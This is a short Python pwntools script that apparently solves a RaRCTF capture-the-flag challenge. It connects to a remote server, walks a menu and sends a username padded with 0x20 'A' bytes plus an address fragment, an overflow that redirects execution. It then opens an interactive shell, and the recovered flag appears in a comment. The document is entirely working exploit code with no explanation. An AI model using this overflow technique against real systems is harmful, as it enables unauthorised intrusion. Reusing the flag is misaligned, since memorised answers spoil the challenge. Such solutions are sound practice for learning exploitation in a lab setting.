from pwn import *

#context.log_level = 'debug'

p = remote('193.57.159.27','28484')


p.recvuntil('> ')
p.sendline('3')
p.recvuntil('Enter new username: ')
p.sendline(b'A'*0x20+b'\x3b\x15\x40')

p.recvuntil('> ')
p.sendline('3')

p.recvuntil('> ')
p.sendline('0')

p.recvuntil('> ')
p.sendline('2')


p.interactive()
#rarctf{:O,Y0U-f0und-4-z3r0-d4y!!1!_0038abff7c}